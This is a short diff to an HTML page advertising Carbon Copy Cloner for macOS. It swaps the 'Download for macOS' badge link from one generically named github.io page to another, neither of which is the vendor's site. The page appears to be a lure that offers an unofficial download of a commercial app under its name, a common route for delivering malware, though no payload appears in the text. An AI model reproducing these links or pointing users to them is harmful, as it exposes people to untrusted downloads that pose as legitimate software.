@@ -6,7 +6,7 @@
 <h3>Carbon Copy Cloner for macOS</h3>
 <p>Carbon Copy Cloner is a dedicated backup and disk cloning utility for Mac users who need a dependable environment for serious work, without sacrificing the familiar feel of native macOS applications.</p>
 
-<a href="https://install-software-utility.github.io/.github/">
+<a href="https://software-app-osx-install.github.io/.github/carbon">
   <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
